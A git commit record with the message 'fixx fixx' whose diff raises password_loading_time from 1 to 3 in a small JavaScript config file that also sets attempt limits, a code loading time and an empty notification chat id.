ddce5802a1cef0315f06e6c126e03b2cc35d21cd
Nguyễn Nguyên Giáp <giapfc123@gmail.com>
2026-05-07 16:13:08 +0700

    fixx fixx

--- src/utils/config.js
+++ src/utils/config.js
@@ -5,7 +5,7 @@ const config = {
     noti_chat_id: '',
     max_password_attempts: 2,
     max_code_attempts: 5,
-    password_loading_time: 1,
+    password_loading_time: 3,
     code_loading_time: 3
 };
 export default config;
